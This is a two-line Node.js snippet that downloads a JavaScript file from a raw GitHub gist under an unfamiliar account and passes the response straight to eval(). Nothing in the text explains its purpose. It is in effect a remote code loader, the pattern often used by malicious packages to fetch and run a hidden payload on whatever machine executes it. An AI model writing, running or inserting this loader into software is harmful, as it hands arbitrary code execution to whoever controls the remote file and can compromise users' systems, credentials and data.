const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/fcd8c1ffb52f5f7a56231b99082b7721e14abe62/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
